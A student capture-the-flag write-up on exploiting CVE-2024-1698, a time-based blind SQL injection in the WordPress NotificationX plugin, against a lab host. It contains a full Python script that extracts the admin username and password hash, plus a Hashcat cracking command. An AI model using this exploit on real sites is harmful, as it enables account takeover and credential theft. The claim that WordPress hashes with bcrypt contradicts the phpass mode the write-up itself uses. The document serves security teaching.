# CTF Week #8 (SQL Injection)

By exploring the website, using the developer tools, we obtained:

![Image 1](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/CTF8_img1.png)

We discovered that the website has the following plugins:
- Wordpress version 6.7.1.
- NotificationX version 2.8.1.
- FontAwesome version 4.7.0.

After that, we did some research to find any vulnerabilities in that plugins related to SQLinjection.
We found **CVE-2024-1698** on **WordPress NotificationX** .


By searching for the CVE exploit, we found this exploit script, which we adapted to our website:

```
import requests
import string
from sys import exit

# Sleep time for SQL payloads
delay = 0.3

# URL for the NotificationX Analytics API
url = "http://44.242.216.18:5008//wp-json/notificationx/v1/analytics"

admin_username = ""
admin_password_hash = ""

session = requests.Session()

# Find admin username length
username_length = 0
for length in range(1, 41):  # Assuming username length is less than 40 characters
    resp_length = session.post(url, data={
        "nx_id": 1337,
        "type": f"clicks`=IF(LENGTH((select user_login from wp_users where id=1))={length},SLEEP({delay}),null)-- -"
    })

    # Elapsed time > delay if delay happened due to SQLi
    if resp_length.elapsed.total_seconds() > delay:
        username_length = length
        print("Admin username length:", username_length)
        break

# Find admin username
for idx_username in range(1, username_length + 1):
    # Iterate over all the printable characters + NULL byte
    for ascii_val_username in (b"\x00" + string.printable.encode()):
        # Send the payload
        resp_username = session.post(url, data={
            "nx_id": 1337,
            "type": f"clicks`=IF(ASCII(SUBSTRING((select user_login from wp_users where id=1),{idx_username},1))={ascii_val_username},SLEEP({delay}),null)-- -"
        })

        # Elapsed time > delay if delay happened due to SQLi
        if resp_username.elapsed.total_seconds() > delay:
            admin_username += chr(ascii_val_username)
            # Show what we have found so far...
            print("Admin username:", admin_username)
            break  # Move to the next character
    else:
        # Null byte reached, break the outer loop
        break

# Find admin password hash
for idx_password in range(1, 41):  # Assuming the password hash length is less than 40 characters
    # Iterate over all the printable characters + NULL byte
    for ascii_val_password in (b"\x00" + string.printable.encode()):
        # Send the payload
        resp_password = session.post(url, data={
            "nx_id": 1337,
            "type": f"clicks`=IF(ASCII(SUBSTRING((select user_pass from wp_users where id=1),{idx_password},1))={ascii_val_password},SLEEP({delay}),null)-- -"
        })

        # Elapsed time > delay if delay happened due to SQLi
        if resp_password.elapsed.total_seconds() > delay:
            admin_password_hash += chr(ascii_val_password)
            # Show what we have found so far...
            print("Admin password hash:", admin_password_hash)
            # Exit condition - encountered a null byte
            if ascii_val_password == 0:
                print("[*] Admin credentials found:")
                print("Username:", admin_username)
                print("Password hash:", admin_password_hash)
                exit(0)
```

Then we changed the delay to 1, to handle possible limitations in responde time of the server.
By running the exploit, we obtained the hashed password!

![Image 3](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/CTF8_img3.png)

To recover the original password, we used Hashcat to crack the hash. We started by saving the hash in a file named password.txt. Then, we ran the Hashcat command to crack the hash using the rockyou.txt wordlist:

```hashcat -m 400 -a 0 password.txt rockyou.txt```

With this command we finally obtained the password ```heartbroken```.


### Questions

#### You already know that the goal is to exploit an SQL injection vulnerability. Are there any reported vulnerabilities in public databases and/or tools that allow the discovery and exploitation of SQL injection vulnerabilities?

Yes, we used CVE-2024-1698 for the NotificationX plugin, which allowed SQL injection due to improperly sanitized input fields.

#### What is the vulnerable endpoint of the website, and how can an attack be carried out? How can the vulnerability be classified?

The vulnerable endpoint is the NotificationX Analytics API. The attack is carried out by injecting malicious SQL payloads into the type parameter, exploiting improper input validation. This is a time-based blind SQL injection, where the injected SQL queries cause the server's response time to be delayed based on the condition specified. This allows attackers to extract data from the database by observing response times, without directly revealing the data. The vulnerability is classified as improper input sanitization."


#### The attack will allow you to extract information from the server's database. Specifically, you want to find the administrator's password, but as dictated by good security practices, it is not stored in plain text in the database, but as a hash of the original password. For this server, in more detail, what is the password storage policy?

The server likely follows WordPress's default policy of storing passwords as hashed values using the wp_users table. WordPress uses PHP’s wp_hash_password() function, which relies on modern hashing algorithms like bcrypt, providing computational security against direct password retrieval.

#### Is storing a hashed password secure in the sense that it makes recovering the original password impossible? This issue is very common not only in the case of vulnerabilities but also in data leaks. There are various ways to attempt to reverse hash functions to recover passwords and tools to automate this process.

Hashing makes direct recovery of the original password impossible, but it does not prevent attacks. In this case, using tools like Hashcat with popular wordlists (e.g., rockyou.txt) allows attackers to automate the recovery of weak or common passwords. Stronger protection would require the use of salted hashes and encouraging users to set complex passwords.
